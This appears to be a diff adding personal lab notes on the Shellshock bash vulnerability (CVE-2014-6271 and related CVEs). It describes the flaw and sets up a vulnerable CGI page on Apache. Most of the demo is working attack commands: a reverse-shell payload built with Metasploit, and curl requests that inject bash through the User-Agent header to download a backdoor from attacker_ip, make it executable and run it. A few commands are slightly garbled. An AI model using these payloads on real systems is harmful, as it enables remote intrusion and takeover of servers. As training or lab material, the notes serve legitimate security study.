@@ -1,0 +1,47 @@
+Shell Shock : 
+
+Remote Code execution Vulnerability
+Disclosed in 24 sep 2014
+Bash version upto 4.3
+
+cve - 2014-6271, 6277, 6278, 7169
+
+-> Executes trailing strings in function definition of environment variable
+
+-> Magic String: {:;};
+
+E.G:-> env x='() {:;}; echo shell'
+
+Attacks:-
+-> HTTP (cgi Pages): No Auth 
+-> SSH: Require Auth 
+-> DHCP Server
+
+Demo Time :- 
+gedit index_shell.cgi 
+#!/bin/bash 
+echo "Content-type: text/html"
+echo ""
+echo "Shell Shock Attack"
+
+cp index_shell.cgi /var/www/cgi-bin/
+
+Note: Enable the apache to read & execute cgi file instead of just displaying as text 
+Reference for above Note: https://www.techrepublic.com/blog/diy-it-guy/diy-enable-cgi-on-your-apache-server/
+
+service apache2 start 
+
+Open Browser :-> http://ip/cgi-bin/index_shell.cgi
+
+From Attacker Machine:
+msfconsole -p linux/x64/shell/reverse_tcp LHOST=ip LPORT=4444 X > /var/www/backdoor
+msfconsole.........
+use multi/handler
+
+curl -k -H 'User-Agent: () { :;}; /bin/bash -c "wget http://attacker_ip/backdoor -O /tmp/backdoor"' http://victim_ip/cgi-bin/index_shell/cgi
+Note: if we get 500 error then file transfer was successfull to victim machine or command was successfully executed 
+and if we get 200 response then it means attack is not successfull
+
+curl -k -H 'User-Agent: () { :;}; /bin/bash -c "chmod +x /tmp/backdoor"' http://victim_ip/cgi-bin/index_shell/cgi
+
+curl -k -H 'User-Agent: () { :;}; /bin/bash -c "exec /tmp/backdoor"' http://victim_ip/cgi-bin/index_shell/cgi
